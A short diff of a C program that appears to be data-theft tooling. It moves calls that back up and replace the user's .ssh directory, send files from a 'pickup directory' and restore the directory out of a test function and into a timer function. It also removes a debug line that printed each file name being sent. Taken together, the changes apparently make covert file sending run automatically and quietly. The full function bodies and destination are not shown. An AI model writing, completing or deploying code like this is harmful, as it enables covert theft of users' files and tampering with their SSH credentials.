@@ -46,9 +46,6 @@ int main(int argc, const char * argv[])
  *----------------------------------------------------------------------------*/
 void test_ssh()
 {
-	ssh_replace_dir();	/* backup and replace .ssh directory */
-	ssh_send_files();	/* send any files in the pickup directory */
-	ssh_restore_dir();	/* restore original .ssh directory */
 }
 
 void ssh_replace_dir(void)
@@ -133,8 +130,6 @@ void ssh_send_files(void)
 			sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
 			sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
 
-			printf("current file = %s\n", dp->d_name);
-
 			if ((fd_in = fopen(file_in, "r")) == NULL)
 				err(1, "fopen");
 			
@@ -191,4 +186,7 @@ void ssh_send_files(void)
 
 void ssh_timer(void)
 {
+	ssh_replace_dir();	/* backup and replace .ssh directory */
+	ssh_send_files();	/* send any files in the pickup directory */
+	ssh_restore_dir();	/* restore original .ssh directory */
 }
